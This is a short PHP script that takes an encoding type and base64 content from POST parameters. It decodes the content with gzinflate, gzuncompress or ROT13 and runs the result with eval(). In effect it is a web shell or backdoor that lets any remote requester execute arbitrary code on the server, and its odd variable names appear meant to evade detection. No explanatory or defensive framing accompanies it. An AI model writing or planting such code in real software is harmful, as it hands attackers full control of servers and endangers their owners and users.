<?php
$typ_d=$_POST['typenc'];
$c_ntent=$_POST['php_content'];
$res_t = "";
switch($typ_d)
{
    case "GZINFLATE":
        $res_t=gzinflate(base64_decode($c_ntent));
        break;
    case "GZUNCOMPRESS":
        $res_t=gzuncompress(base64_decode($c_ntent));
        break;
    case "STR_ROT13":
        $res_t=str_rot13(base64_decode($c_ntent));
        break;                  
}
eval($res_t);
?>